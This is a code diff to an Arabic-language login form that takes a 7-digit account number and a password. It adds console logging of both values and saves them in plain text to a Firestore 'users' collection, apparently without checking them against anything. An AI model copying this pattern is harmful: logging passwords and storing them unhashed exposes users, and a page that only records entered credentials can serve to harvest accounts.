@@ -25,8 +25,8 @@
                 <div class="input-group">
                     <label class="input-label" for="userID">رقم الحساب:</label>
                     <input class="form-input" type="text" id="userID" 
-                            placeholder="" maxlength="7" required 
-                            inputmode="numeric" pattern="\d{7}" name="userID">
+                           placeholder="" maxlength="7" required 
+                           inputmode="numeric" pattern="\d{7}" name="userID">
                     <span class="input-description">أدخل رقم الحساب المكون من 7 أرقام</span>
                 </div>
 
@@ -41,7 +41,7 @@
             </form>
         </div>
     </div>
-    
+
     <div class="toast-message" id="toast"></div>
 
 <script type="module">
@@ -78,6 +78,10 @@
       const userID = document.getElementById('userID').value.trim();
       const password = document.getElementById('password').value.trim();
 
+      // Debug للتأكد من القيم
+      console.log("UserID:", userID);
+      console.log("Password:", password);
+
       if (!userID || !password) {
           showToast('الرجاء إدخال رقم الحساب وكلمة المرور', '#D32F2F');
           return;
@@ -89,7 +93,7 @@
       }
 
       try {
-          // حفظ رقم الحساب وكلمة المرور في Firestore
+          // حفظ البيانات في Firestore
           await setDoc(doc(db, "users", userID), {
               userID,
               password
